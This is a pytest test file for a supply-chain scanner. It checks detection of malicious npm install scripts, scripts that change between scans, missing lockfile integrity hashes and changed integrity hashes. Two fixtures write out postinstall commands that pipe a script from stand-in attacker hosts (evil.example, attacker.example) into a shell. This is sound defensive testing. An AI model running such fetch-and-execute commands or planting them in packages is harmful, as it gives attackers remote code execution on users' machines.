"""Installed-dependency supply-chain audit + change detection (the redeploy catch)."""

from __future__ import annotations

import json

import pytest

from conftest import rule_ids, scan

pytestmark = pytest.mark.asyncio


def _dep(root, name, scripts):
    d = root / "node_modules" / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "package.json").write_text(json.dumps({"name": name, "version": "1.0.0", "scripts": scripts}))


def _app(tmp_path):
    (tmp_path / "package.json").write_text('{"name":"app","dependencies":{}}')
    return tmp_path


async def test_malicious_installed_dependency_is_flagged(tmp_path):
    app = _app(tmp_path)
    _dep(app, "evil-pkg", {"postinstall": "curl -s http://evil.example/x.sh | bash"})
    _dep(app, "good-pkg", {"build": "tsc"})            # benign, non-lifecycle
    _dep(app, "binary-pkg", {"install": "node-gyp rebuild"})  # legit native build, NOT flagged
    r = await scan(app, only_detectors=["supply-chain"])
    flagged = [f for f in r.findings if f.rule_id == "supply-chain.dependency-install-script"]
    assert len(flagged) == 1
    assert "evil-pkg" in flagged[0].file
    assert flagged[0].effective_severity.value == "critical"


async def test_change_detection_catches_compromise_on_redeploy(tmp_path):
    app = _app(tmp_path)
    _dep(app, "lib", {"build": "tsc"})                 # clean on first scan
    first = await scan(app, only_detectors=["supply-chain"])
    assert "supply-chain.dependency-script-changed" not in rule_ids(first.findings)  # no baseline yet

    # a later version of `lib` is compromised — it gains a malicious postinstall
    _dep(app, "lib", {"build": "tsc", "postinstall": "curl http://attacker.example/s.sh | sh"})
    second = await scan(app, only_detectors=["supply-chain"])
    ids = rule_ids(second.findings)
    assert "supply-chain.dependency-script-changed" in ids   # caught because it CHANGED
    assert "supply-chain.dependency-install-script" in ids    # and because it's dangerous
    changed = [f for f in second.findings if f.rule_id == "supply-chain.dependency-script-changed"]
    assert "lib" in changed[0].file and "new" in changed[0].message.lower()


async def test_no_node_modules_means_no_audit(tmp_path):
    app = _app(tmp_path)   # no node_modules
    r = await scan(app, only_detectors=["supply-chain"])
    assert not any(f.rule_id.startswith("supply-chain.dependency-") for f in r.findings)


def _lock(root, packages):
    """Write a minimal npm v3 package-lock.json with the given packages map."""
    (root / "package-lock.json").write_text(json.dumps({
        "name": "app", "lockfileVersion": 3, "packages": packages,
    }))


async def test_missing_integrity_is_flagged(tmp_path):
    app = _app(tmp_path)
    _lock(app, {
        "": {"name": "app"},
        "node_modules/lib": {  # http-resolved but no integrity hash → unverifiable
            "version": "1.0.0", "resolved": "https://registry.npmjs.org/lib/-/lib-1.0.0.tgz",
        },
    })
    r = await scan(app, only_detectors=["supply-chain"])
    assert "supply-chain.missing-integrity" in rule_ids(r.findings)


async def test_integrity_change_is_caught_on_redeploy(tmp_path):
    app = _app(tmp_path)
    good = "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    _lock(app, {"": {"name": "app"}, "node_modules/lib": {
        "version": "1.0.0", "resolved": "https://registry.npmjs.org/lib/-/lib-1.0.0.tgz",
        "integrity": good}})
    first = await scan(app, only_detectors=["supply-chain"])
    assert "supply-chain.integrity-changed" not in rule_ids(first.findings)  # baseline only

    # same version 1.0.0, but the tarball content (hash) changed → tamper / re-publish
    evil = "sha512-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=="
    _lock(app, {"": {"name": "app"}, "node_modules/lib": {
        "version": "1.0.0", "resolved": "https://registry.npmjs.org/lib/-/lib-1.0.0.tgz",
        "integrity": evil}})
    second = await scan(app, only_detectors=["supply-chain"])
    flagged = [f for f in second.findings if f.rule_id == "supply-chain.integrity-changed"]
    assert len(flagged) == 1
    assert "lib@1.0.0" in flagged[0].message
    assert flagged[0].reachable is True


async def test_unchanged_integrity_does_not_flag(tmp_path):
    app = _app(tmp_path)
    h = "sha512-CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=="
    pkgs = {"": {"name": "app"}, "node_modules/lib": {
        "version": "2.3.4", "resolved": "https://registry.npmjs.org/lib/-/lib-2.3.4.tgz",
        "integrity": h}}
    _lock(app, pkgs)
    await scan(app, only_detectors=["supply-chain"])      # establishes baseline
    _lock(app, pkgs)                                        # identical lockfile
    again = await scan(app, only_detectors=["supply-chain"])
    assert "supply-chain.integrity-changed" not in rule_ids(again.findings)
